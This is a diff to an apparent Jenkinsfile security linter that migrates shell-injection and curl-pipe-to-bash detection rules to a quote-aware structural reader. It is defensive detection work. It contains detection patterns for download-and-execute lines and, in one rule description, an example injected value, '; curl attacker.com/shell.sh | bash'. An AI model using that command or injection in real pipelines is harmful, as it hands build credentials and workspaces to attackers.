@@ -135,7 +135,9 @@ class _JenkinsfileShellLeafPattern:
                     continue
                 if not ev.value:
                     continue
-                if not self._predicate(ev.value):
+                # predicate(body, interpolated): quote-aware rules use the
+                # second arg to fire only on interpolating GString bodies.
+                if not self._predicate(ev.value, ev.interpolated):
                     continue
                 if 0 < ev.line <= len(lines):
                     snippet = lines[ev.line - 1].strip() or ev.value.strip()
@@ -182,7 +184,11 @@ class _JenkinsfileShellLeafPattern:
             if body_end < 0:
                 continue
             body = content[body_start:body_end]
-            if not self._predicate(body):
+            # Double / triple-double quotes are interpolating GStrings; single
+            # quotes leave ${...} literal. Mirrors the island reader's flag so
+            # quote-aware predicates behave identically on the fallback path.
+            interpolated = quote in ('"', '"""')
+            if not self._predicate(body, interpolated):
                 continue
             line_num = content.count("\n", 0, match.start()) + 1
             snippet = lines[line_num - 1].strip() if 0 < line_num <= len(lines) else body.strip()
@@ -192,6 +198,69 @@ class _JenkinsfileShellLeafPattern:
             seen.add(key)
             results.append(key)
         return results
+
+
+# --- Quote-aware structural predicates for the injection family. Each reads the
+# shell-sink body from the island reader and fires only when the body is an
+# INTERPOLATING GString (interpolated=True) — a single-quoted body leaves
+# ${params.X}/${env.X} literal (no Groovy interpolation) and is NOT the finding.
+# The body regexes are the originals minus the `(?:sh|...)\s+"{1,3}.*` call/quote
+# wrapper, which the structural reader (incl. the sh(script:...) method form and
+# pwsh) now handles. ---
+_SEC4_JK_001_BODY_RE = re.compile(
+    r"\$\{\s*params\s*(?:\.[A-Za-z_][A-Za-z0-9_-]*|\[['\"][^'\"]+['\"]\])\s*\}"
+)
+
+
+def _sec4_jk_001_predicate(shell_body: str, interpolated: bool) -> bool:
+    """SEC4-JK-001: a user-controlled build parameter (``${params.X}``)
+    interpolated into a shell sink, GString only."""
+    return interpolated and bool(_SEC4_JK_001_BODY_RE.search(shell_body))
+
+
+_SEC4_JK_002_BODY_RE = re.compile(
+    r"\$\{?env\.(?:GIT_BRANCH|BRANCH_NAME|CHANGE_BRANCH|CHANGE_TITLE"
+    r"|CHANGE_AUTHOR|TAG_NAME|ghprb\w+)"
+)
+
+
+def _sec4_jk_002_predicate(shell_body: str, interpolated: bool) -> bool:
+    """SEC4-JK-002: an SCM-controlled env var (``${env.GIT_BRANCH}`` etc.)
+    interpolated into a shell sink, GString only."""
+    return interpolated and bool(_SEC4_JK_002_BODY_RE.search(shell_body))
+
+
+_SEC4_JK_008_BODY_RE = re.compile(
+    r"\$\{?\s*env\s*\.\s*(?!(?:JOB_NAME|JOB_BASE_NAME|JOB_URL|"
+    r"BUILD_NUMBER|BUILD_ID|BUILD_TAG|BUILD_URL|"
+    r"BUILD_DISPLAY_NAME|STAGE_NAME|RUN_DISPLAY_URL|"
+    r"RUN_ARTIFACTS_DISPLAY_URL|RUN_CHANGES_DISPLAY_URL|"
+    r"WORKSPACE|JENKINS_HOME|JENKINS_URL|"
+    r"NODE_NAME|NODE_LABELS|EXECUTOR_NUMBER|"
+    r"PATH|HOME|USER|HOSTNAME|"
+    r"BRANCH_NAME|CHANGE_ID|CHANGE_TARGET|GIT_COMMIT|GIT_BRANCH|GIT_URL"
+    r")\b)[A-Za-z_]"
+)
+
+
+def _sec4_jk_008_predicate(shell_body: str, interpolated: bool) -> bool:
+    """SEC4-JK-008: a user-defined env var (not a Jenkins built-in) interpolated
+    into a shell sink, GString only — review-needed provenance."""
+    return interpolated and bool(_SEC4_JK_008_BODY_RE.search(shell_body))
+
+
+_SEC9_JK_001_BODY_RE = re.compile(r"(?:curl|wget)\s+\S[^\n]*\|\s*(?:ba)?sh\b")
+
+
+def _sec9_jk_001_predicate(shell_body: str, _interpolated: bool = False) -> bool:
+    """SEC9-JK-001 (structural): a SINGLE shell line downloads (curl/wget) and
+    pipes straight to an interpreter (``| sh`` / ``| bash``). Reads the
+    shell-sink body from the island reader, so the ``sh(script: 'curl ... |
+    bash')`` method-call form is now caught — the prior ``sh\\s+<quote>`` regex
+    missed it. Kept SAME-LINE only (per-line search) to preserve the partition
+    with SEC9-JK-004, which owns the cross-line / non-shell-pipe / two-step
+    shapes (avoids double-report)."""
+    return any(_SEC9_JK_001_BODY_RE.search(line) for line in shell_body.splitlines())
 
 
 # Predicate for SEC9-JK-004: download-pipe-to-interpreter and PowerShell
@@ -312,7 +381,7 @@ _SEC9_JK_004_TWO_STEP_CHECKSUM_RE = re.compile(
 )
 
 
-def _sec9_jk_004_predicate(shell_body: str) -> bool:
+def _sec9_jk_004_predicate(shell_body: str, _interpolated: bool = False) -> bool:
     """Return True when a shell body matches a download-pipe-to-
     interpreter or PowerShell remote-execution shape that the
     line-scoped SEC9-JK-001 regex cannot reach.
@@ -1067,11 +1136,11 @@ RULES: list[Rule] = [
             "environment with access to all credentials, secrets, and build artefacts. "
             "Verify downloads with a SHA256 checksum before executing."
         ),
-        pattern=RegexPattern(
-            match=r'sh\s+[\'"\{]{1,3}[^\'"}]*(?:curl|wget)\s+\S[^\'"}]*\|\s*(?:ba)?sh',
-            exclude=[r"^\s*//"],
-            groovy_comment_aware=True,
-        ),
+        # J2: migrated to the structural island reader — catches the
+        # sh(script: 'curl ... | bash') method-call form the regex missed, and
+        # masks comments/strings structurally. Same-line partition with
+        # SEC9-JK-004 preserved by the predicate.
+        pattern=_JenkinsfileShellLeafPattern(_sec9_jk_001_predicate),
         remediation=(
             "Download the script separately, verify its checksum, then execute:\n\n"
             "// BAD\n"
@@ -1126,18 +1195,11 @@ RULES: list[Rule] = [
             "a value like `; curl attacker.com/shell.sh | bash` runs as part of the "
             "build with access to all bound credentials and workspace contents."
         ),
-        pattern=RegexPattern(
-            # Only double-quoted Groovy strings (GStrings) interpolate
-            # ${params.X} at Groovy parse time; single-quoted strings
-            # leave the expression literal. Match sh/bat/powershell
-            # double-quote and triple-double-quote forms only. Supports
-            # dot form and bracket form for parameter names with dashes.
-            match=(
-                r'(?:sh|bat|powershell|pwsh)\s+"{1,3}.*\$\{\s*params\s*'
-                r"(?:\.[A-Za-z_][A-Za-z0-9_-]*|\[['\"][^'\"]+['\"]\])\s*\}"
-            ),
-            exclude=[r"^\s*//"],
-        ),
+        # J2: migrated to the structural island reader (quote-aware predicate).
+        # Catches the sh(script: ...) method form + pwsh; the `interpolated`
+        # flag preserves the double-quote-GString-only precision the regex got
+        # from its `"{1,3}` anchor (single-quoted bodies don't interpolate).
+        pattern=_JenkinsfileShellLeafPattern(_sec4_jk_001_predicate),
         remediation=(
             "The root cause is that double-quoted Groovy strings (GStrings) are "
             "interpolated by GROOVY before the executable step runs, so attacker-controlled "
@@ -1211,17 +1273,9 @@ RULES: list[Rule] = [
             "Unlike params.*, these values arrive automatically from webhooks without "
             "any explicit user input step, making them easy to overlook."
         ),
-        pattern=RegexPattern(
-            # Match double-quoted and triple-double-quoted Groovy
-            # strings (both are GStrings and interpolate ${env.X});
-            # single quotes suppress interpolation.
-            match=(
-                r'(?:sh|bat|powershell|pwsh)\s+"{1,3}.*\$\{?env\.'
-                r"(?:GIT_BRANCH|BRANCH_NAME|CHANGE_BRANCH|CHANGE_TITLE"
-                r"|CHANGE_AUTHOR|TAG_NAME|ghprb\w+)"
-            ),
-            exclude=[r"^\s*//"],
-        ),
+        # J2: migrated to the structural island reader (quote-aware predicate);
+        # catches sh(script: ...) + pwsh, GString-only via `interpolated`.
+        pattern=_JenkinsfileShellLeafPattern(_sec4_jk_002_predicate),
         remediation=(
             "Same pattern as SEC4-JK-001: Groovy double-quoted strings interpolate "
             "the attacker-controlled value into the command literal BEFORE `sh` "
@@ -3511,26 +3565,9 @@ RULES: list[Rule] = [
             "``sh`` to a single-quoted GString so Groovy leaves the "
             "expression unexpanded."
         ),
-        pattern=RegexPattern(
-            # Only GStrings (double-quoted) interpolate; single-quoted
-            # leaves $-expressions literal.  Match user-defined env
-            # variables — exclude Jenkins built-ins (JOB_NAME,
-            # BUILD_NUMBER, BUILD_ID, WORKSPACE, BUILD_TAG, etc.)
-            # where the value is server-set, not pipeline-author-set.
-            match=(
-                r'(?:sh|bat|powershell)\s+"{1,3}.*\$\{?\s*env\s*\.\s*'
-                r"(?!(?:JOB_NAME|JOB_BASE_NAME|JOB_URL|"
-                r"BUILD_NUMBER|BUILD_ID|BUILD_TAG|BUILD_URL|"
-                r"BUILD_DISPLAY_NAME|STAGE_NAME|RUN_DISPLAY_URL|"
-                r"RUN_ARTIFACTS_DISPLAY_URL|RUN_CHANGES_DISPLAY_URL|"
-                r"WORKSPACE|JENKINS_HOME|JENKINS_URL|"
-                r"NODE_NAME|NODE_LABELS|EXECUTOR_NUMBER|"
-                r"PATH|HOME|USER|HOSTNAME|"
-                r"BRANCH_NAME|CHANGE_ID|CHANGE_TARGET|GIT_COMMIT|GIT_BRANCH|GIT_URL"
-                r")\b)[A-Za-z_]"
-            ),
-            exclude=[r"^\s*//"],
-        ),
+        # J2: migrated to the structural island reader (quote-aware predicate);
+        # catches sh(script: ...), GString-only via `interpolated`.
+        pattern=_JenkinsfileShellLeafPattern(_sec4_jk_008_predicate),
         remediation=(
             "Either move the value through to the consumer's shell "
             "via a single-quoted (non-interpolating) Groovy string so "
